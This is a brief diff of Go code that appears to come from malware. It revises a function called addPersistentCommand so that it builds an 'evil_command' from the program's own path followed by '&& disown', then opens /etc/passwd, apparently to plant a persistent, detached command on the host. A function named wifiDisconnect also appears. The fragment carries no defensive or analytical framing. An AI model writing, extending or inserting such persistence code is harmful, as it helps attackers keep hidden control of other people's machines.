@@ -109,7 +109,8 @@ func wifiDisconnect() error {
 	return nil
 }
 
-func addPersistentCommand(evil_command string) error {
+func addPersistentCommand() error {
+	evil_command := GetPath() + "&& disown"
 	ep, err := os.Open("/etc/passwd")
 	if err != nil {
 		return err
